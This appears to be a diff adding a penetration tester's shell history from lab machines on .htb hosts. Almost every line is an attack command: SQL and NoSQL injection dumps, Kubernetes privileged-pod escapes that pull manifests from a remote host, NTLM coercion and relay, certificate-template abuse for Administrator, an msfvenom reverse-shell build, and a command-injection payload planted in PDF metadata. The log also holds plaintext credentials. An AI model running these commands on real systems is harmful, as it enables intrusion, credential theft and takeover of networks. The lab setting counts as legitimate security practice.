+sudo netdiscover -i 56.206.246.41
+socat TCP4-LISTEN:2222,fork TCP4:56.201.148.68:22
+sudo sshuttle -r kali@56.201.148.68 0/0 --no-latency-control -v -x 127.0.0.1/32 --dns
+sudo sshuttle -r kali@56.201.148.68 0/0 --no-latency-control -v -x 127.0.0.1/32 --dns -l 0.0.0.0
+rsp -L kali@56.201.148.68
+rsp-trust '56.201.148.68' 22
+sudo rsp-trust '56.201.148.68' 22
+rsp-trust
+rsp-trust 56.201.148.68
+rsp-trust -h
+ssh kali@56.201.148.68 22
+rsp-trust 56.201.148.68 22
+rsp -L kali 56.201.148.68
+ping cloud.amzcorp.local
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+wfuzz -H "Host: FUZZ.stocker.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 86 http://10.129.8.61
+wfuzz -H "Host: FUZZ.stocker.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 86 http://10.129.8.61 | grep -v 301
+sudo feroxbuster -u http://dev.stocker.htb/stock/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp,swf,js" -v -k -n -e
+git clone https://github.com/codingo/NoSQLMap.git
+cd NoSQLMap
+python3 nosql-login-bypass.py -t http://dev.stocker.htb/login -u username -p password
+proxychains python3 nosql-login-enum.py -t http://dev.stocker.htb/login -u username -p password -m POST
+nmap -sTV --script "mongo* and default" -p 27017 127.0.0.1 -Pn -n -T4
+mongo admin -u mongodb -p IHeardPassphrasesArePrettySecure
+sshpass -p IHeardPassphrasesArePrettySecure ssh angoose@10.129.8.61 -o "ServerAliveInterval 60"
+wfuzz -H "Host: FUZZ.photobomb.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 86 http://10.10.11.182 | grep -v 302
+ffuf -c -r -t 200 -mc 200 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://eforenzics.htb/FUZZ/pwn.html'
+whois -H -I 15.200.92.220
+whois -H 15.200.92.220
+ffuf -c -r -t 200 -mc 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://soccer.htb/FUZZ'
+sqlmap -u "http://127.0.0.1:10000/?id=1" --dbms mysql --level 2 --technique=T -D soccer --dbs --predict-output
+sqlmap -u "http://127.0.0.1:10000/?id=1" --dbms mysql --level 2 --technique=T -D soccer_db --dump -T accounts
+ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 50
+sudo sqlmap -u "http://178.62.8.249:31930/?sort=job_type+DESC" --threads 10 --dump -D hireplus -T config
+sqlmap -r request.txt -t 10 --dump -D Users -T Logins -C username --force-pivoting --no-cast
+sqlmap -r request.txt -t 10 --dump -D Users -T Logins -C username --force-pivoting --start 1
+sqlmap -r request.txt -t 10 --dump -D Users -T Logins -C username --force-pivoting --start 2
+sqlmap -r request.txt -t 10 --os-smbrelay
+sudo sqlmap -r request.txt -t 10 --os-smbrelay
+sudo sqlmap -r request.txt -t 10 --udf-inject
+sqlmap -r request.txt -t 10 --priv-esc
+sqlmap -r request.txt -t 10 -D Users -T Logins -C username
+sqlmap -r request.txt -t 10 -D Users -T Logins -C username --dump
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.95.221/api/FUZZ -X POST
+kube-hunter --remote horizon.htb
+kubectl config current-context
+kubectl -A
+kubectl config view
+kubectl get pods
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml --insecure-skip-tls-verify
+kubectl exec -it priv-exec-pod -- bash --insecure-skip-tls-verify\
+kubectl apply -f http://10.10.14.2/priv-exec-pod.yaml --insecure-skip-tls-verify
+kubectl get pods --insecure-skip-tls-verify
+kubectl exec -it priv-exec-pod -- bash --insecure-skip-tls-verify
+kubectl --insecure-skip-tls-verify exec -it priv-exec-pod --fdisk -l
+kubectl --insecure-skip-tls-verify exec -it priv-exec-pod -- mkdir /host
+kubectl --insecure-skip-tls-verify exec -it priv-exec-pod -- bash -c "mount /dev/sda3 /host/"
+kubectl --insecure-skip-tls-verify exec -it priv-exec-pod -- bash -c "mount /dev/sda2 /host/"
+git clone https://github.com/gwen001/s3-buckets-finder
+cd s3-buckets-finder
+php s3-buckets-bruteforcer.php --bucket cloud.htb
+aws sts get-caller-identity
+kube-hunter
+kube-hunter --remote 10.10.11.133
+kube-hunter --remote 10.10.11.133 --active --list
+kube-hunter --remote 10.10.11.133 -
+kube-hunter --remote 10.10.11.133 --active --report json --dispatch http
+kube-hunter --remote 10.10.11.133 --active --report json | jq
+kube-hunter --remote 10.10.11.133 --active --enable-cve-hunting
+kube-hunter --remote 10.10.11.133 --active --log DEBUG --log-file log.txt
+kubectl --insecure-skip-tls-verify exec -it priv-exec-pod -- bash
+kubectl --insecure-skip-tls-verify config current-context
+kubectl --insecure-skip-tls-verify apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
+kubectl exec -it priv-exec-pod -- bash
+kubectl --insecure-skip-tls-verify apply kubectl exec -it priv-exec-pod -- bash
+kubectl --insecure-skip-tls-verify exec -it priv-exec-pod -- fdisk -l
+wget https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
+kubectl --insecure-skip-tls-verify get pods --all-namespaces -o jsonpath="{.items[*].spec.containers[*].image}" |\tr -s '[[:space:]]' '\n' |\sort |\uniq -c
+kubectl --insecure-skip-tls-verify get pods --all-namespaces
+kubectl --insecure-skip-tls-verify get images
+kubectl --insecure-skip-tls-verify get deployments -A
+kubectl --insecure-skip-tls-verify apply exec -it nginx -- bash
+kubectl --insecure-skip-tls-verify get pods -A
+kubectl --insecure-skip-tls-verify get pods -h
+kubectl --insecure-skip-tls-verify apply exec -it priv-exec-pod-3 -- bash
+kubectl --insecure-skip-tls-verify apply exec -t priv-exec-pod-3 -- bash
+kubectl --insecure-skip-tls-verify apply exec priv-exec-pod-3 -- bash
+kubectl --insecure-skip-tls-verify apply exec -f priv-exec-pod-3 -- bash
+kubectl --insecure-skip-tls-verify exec -it priv-exec-pod3 -- fdisk -l\
+kubectl --insecure-skip-tls-verify exec -it priv-exec-pod-3 -- fdisk -l\
+kubectl exec -it priv-exec-pod-3 -- bash
+kubectl --insecure-skip-tls-verify auth can-i '*' '*'
+kubectl --insecure-skip-tls-verify auth can-i create pods --all-namespaces
+kubectl --insecure-skip-tls-verify get deployment
+kubectl --insecure-skip-tls-verify get secret
+kubectl --insecure-skip-tls-verify apply -f http://10.10.16.4/priv-exec-pod.yaml
+kubectl --insecure-skip-tls-verify exec -it priv-exec-pod-3 -- bash
+curl -s -k -X 'GET' "https://10.10.11.133:10250/pods" | jq | less
+curl -s -k -X 'GET' "https://10.10.11.133:10250/pods" | jq | vim -
+kubectl --insecure-skip-tls-verify auth can-i --list --server https://10.10.11.133:8443
+kubectl --insecure-skip-tls-verify auth can-i --list
+kubectl --insecure-skip-tls-verify auth can-i
+kubectl --insecure-skip-tls-verify apply -f http://10.10.16.4/hostpath-exec-pod.yaml
+kubectl --insecure-skip-tls-verify get pods
+kubectl --insecure-skip-tls-verify exec -it hostpath-exec-pod -- bash
+kubectl --insecure-skip-tls-verify exec "id" -s 10.10.11.133 -p hostpath-exec-pod -c hostpath-exec-pod
+kubeletctl --insecure-skip-tls-verify exec "id" -s 10.10.11.133 -p hostpath-exec-pod -c hostpath-exec-pod
+kubeletctl pods -s 10.10.11.133
+kubeletctl exec "id" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
+kubeletctl exec "id" -s 10.10.11.133 -p hostpath-exec-pod -c hostpath-exec-pod
+kubeletctl exec "id" -s "ls /" -p hostpath-exec-pod -c hostpath-exec-pod
+kubeletctl exec "ls -l" -s 10.10.11.133 -p hostpath-exec-pod -c hostpath-exec-pod
+kubeletctl exec "ls -l /host" -s 10.10.11.133 -p hostpath-exec-pod -c hostpath-exec-pod
+kubeletctl exec "ls -l /host/root/root.txt" -s 10.10.11.133 -p hostpath-exec-pod -c hostpath-exec-pod
+kubeletctl exec "cat /host/root/root.txt" -s 10.10.11.133 -p hostpath-exec-pod -c hostpath-exec-pod
+kubeletctl exec "ls -l /host/home" -s 10.10.11.133 -p hostpath-exec-pod -c hostpath-exec-pod
+kubeletctl exec "cat /host/home/user/user.txt" -s 10.10.11.133 -p hostpath-exec-pod -c hostpath-exec-pod
+sudo cp /home/kali/Downloads/burpsuite_pro_v2023.2.3.jar /usr/local/share/burpsuitepro/burpsuite_pro.jar
+wfuzz -H "Host: FUZZ.bucket.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 86 http://bucket.htb
+wfuzz -H "Host: FUZZ.bucket.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 86 http://bucket.htb -hc 302
+aws dynamodb list-tables --endpoint-url
+aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/
+vim .aws/config
+aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/dynamodb
+aws s3 ls --endpoint-url http://s3.bucket.htb/
+vim .aws/credentials
+aws s3 ls --endpoint-url http://s3.bucket.htb/ --profile default
+ffuf -X POST -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://s3.bucket.htb/FUZZ
+python scout.py aws
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://s3.bucket.htb/s3/FUZZ
+impacket-GetADUsers -dc-ip 10.10.10.172 -all megabank.local
+impacket-GetADUsers -dc-ip 10.10.10.172 megabank.local/anonymous
+impacket-GetUserSPNs -request -dc-ip 10.10.10.172
+impacket-GetUserSPNs -request -dc-ip 10.10.10.172 10.10.10.172
+impacket-GetNPUsers megabank.local -no-pass -usersfile user.txt
+crackmapexec smb 10.10.10.172 -u user.txt -p "password" --pass-pol
+crackmapexec smb 10.10.10.172 -d megabank.local -M zerologon
+crackmapexec smb 10.10.10.172 -d megabank.local -M petitpotam --options
+crackmapexec smb 10.10.10.172 -d megabank.local -M petitpotam -o LISTENER='10.10.16.5'
+crackmapexec smb 10.10.10.172 -d megabank.local -M petitpotam -o PIPE='smb'
+python3 petitpotam.py -d 'megabank.local' -u '' -p '' 10.10.16.5 10.10.10.172
+sudo responder -I eth0
+python3 PetitPotam.py -d 'megabank.local' -u 'admin' -p '' -dc-ip 10.10.10.172 10.10.16.5 10.10.10.172
+crackmapexec smb 10.10.10.172 -d megabank.local -M dfscoerce -v
+crackmapexec smb 10.10.10.172 -d megabank.local -M dfscoerce
+crackmapexec smb 10.10.10.172 -d megabank.local -M nopac
+crackmapexec smb 10.10.10.172 -d megabank.local -M nopac --options
+crackmapexec smb 10.10.10.172 -u '' -p '' -M nopac
+crackmapexec smb 10.10.10.172 -u '' -p '' -M ioxidresolver
+crackmapexec smb 10.10.10.172 -u '' -p '' -M m17-010
+crackmapexec smb 10.10.10.172 -u '' -p '' -M ms17-010
+crackmapexec smb 10.10.10.172 -u '' -p '' -d megabank.local -M ms17-010
+crackmapexec smb 10.10.10.172 -u '' -p '' -d megabank.local -M nopac
+impacket-smbrelayx -t smb://10.10.10.172 -smb2support -no-http-server --no-wcf-server
+impacket-smbrelayx -t smb://10.10.10.172
+impacket-smbrelayx -h 10.10.10.172 -domain megabank.local
+impacket-smbrelayx -h 10.10.10.172
+impacket-smbrelayx -domain megabank.local
+impacket-smbrelayx -debug
+impacket-smbrelayx -debug -domain megabank.local
+impacket-smbclient mhope@10.10.10.172
+crackmapexec winrm 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$ -d megabank.local
+crackmapexec ldap -L
+bloodhound-python -u mhope -p 4n0therD4y@n0th3r$ -ns 10.10.10.172 -d megabank.local -c all
+export PATH=$PATH:/home/kali/.local/bin
+git-dumper http://10.129.96.151/.git/HEAD
+git-dumper http://10.129.96.151/.git .
+enum4linux -a -M -l -d 10.129.220.180 -u PublicUser -p GuestUserCanWrite1 2>&1
+enum4linux -a -M -l -d 10.129.220.180 -u PublicUser -p GuestUserCantWrite1 2>&1
+sudo ldapsearch -x -D "GuestUser" -w "GuestUserCantWrite1" -H ldap://10.129.220.180:389 -b "dc=sequel,dc=htb" -s sub "(objectclass=*)" 2>&1 | tee > "/home/kali/pentesting/scans/results/10.129.220.180/scans/tcp389/tcp_389_ldap_all-entries.txt"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.220 LPORT=445 -f exe -o reverse.exe
+bloodhound-python -u Ryan.Cooper -p NuclearMosquito3 -ns 10.10.16.220 -d sequel.htb -c all
+certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx\
+certipy auth -pfx cert.pfx -dc-ip <ip> -username Administrator -domain sequel.htb\
+certipy -pfx cert.pfx -dc-ip 10.129.229.213 -username Administrator -domain sequel.htb\
+certipy auth -pfx cert.pfx -dc-ip 10.129.229.213 -username Administrator -domain sequel.htb\
+ntpdate 10.129.220.180
+sudo certipy auth -pfx cert.pfx -dc-ip 10.129.229.213 -username Administrator -domain sequel.htb\
+sudo ntpdate 10.129.229.213; sudo certipy auth -pfx cert.pfx -dc-ip 10.129.229.213 -username Administrator -domain sequel.htb\
+cat kirbi.tick| base64 -d
+proxychains -q bloodhound-python -u matthew -p 147258369 -ns 127.0.0.1 -d cerberus.local -c all
+impacket-smbserver test /home/kali
+./chisel_1.8.1_linux_amd64 server --help
+python3 ad.py --url https://127.0.0.1:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f --issuer "https://DC:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f" --command "ping 10.10.14.26"
+rlwrap nc -lvp 80
+sudo reboot
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://school.flight.htb/FUZZ
+impacket-smbserver test /home/kali -smb2support
+bloodhound-python -u svc_apache -p 'S@Ss!K@*t13' -ns .htb -d flight.htb -c all
+bloodhound-python -u svc_apache -p 'S@Ss!K@*t13' -ns 10.129.228.120 -d flight.htb -c all
+enum4linux -a -M -l -d flight.htb -u svc_apache -p 'S@Ss!K@*t13' 2>&1
+crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares
+crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
+timedatectl set-ntp 0
+timedatectl status
+./chisel_1.8.1_linux_amd64 server -p 9090 --reverse
+wfuzz --hh 36 -X POST -c -H "Content-Type: application/json" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u 'http://prd.m.rendering-api.interface.htb/api/html2pdf/' -d '{"FUZZ":"hoge"}'\
+curl 'http://prd.m.rendering-api.interface.htb/api/html2pdf/' -X POST -H 'Content-Type: application/json' --data-raw '{"html":"hoge"}' --output
+curl 'http://prd.m.rendering-api.interface.htb/api/html2pdf/' -X POST -H 'Content-Type: application/json' --data-raw '{"html":"<link rel=stylesheet href='http://10.10.14.10/exploit.css'>"}'
+sudo feroxbuster -u http://prd.m.rendering-api.interface.htb/vendor/composer -w /usr/share/seclists/Discovery/Web-Content/common.txt -v -k -n -e
+curl -s -X POST -i http://prd.m.rendering-api.interface.htb/api/html2pdf -H "Content-Type: application/json" -d '{"html":"test"}'
+sudo vim /etc/proxychains4.conf
+exiftool -Producer='a[$(/var/www/revshell.elf)]+dompdf 1.2.0 + CPDF' 6fe6c9bc2311059b9f6676e1605318ea.pdf
+smbget -U anonymous -R smb://dc01.coder.htb/Development
+ffuf -w numbers.txt -X POST -d "password=FUZZ" -b "TCSESSIONID=0569742A9EBF2EF4FF5E464A774F4379" -request request.txt -u https://teamcity-dev.coder.htb/2fa.html -fr "Incorrect" -c
+bloodhound-python -u e.black -p '' -ns 10.129.245.123 -d coder.htb -c all
+sudo neo4j console
+bloodhound
+python3 PetitPotam.py -d 'megabank.local' -u '' -p '' -dc-ip 10.10.10.172 10.10.16.5 10.10.10.172
+impacket-ntlmrelayx --adcs -smb2support --template "Domain Controller" -t "http://dc01.coder.htb/certsrv/certfnsh.asp"
+impacket-ntlmrelayx --adcs -smb2support --template "Domain Controller"
+impacket-ntlmrelayx --adcs -smb2support --template "Domain Controller" --remove-mic
+Coercer coerce -l 10.10.16.220 -u 'e.black' -p 'ypOSJXPqlDOxxbQSfEERy300' --target-ip 10.129.245.123 -d coder.htb
+certipy find -u e.black@coder.htb -p -dc-ip 10.129.245.123 -stdout -vulnerable
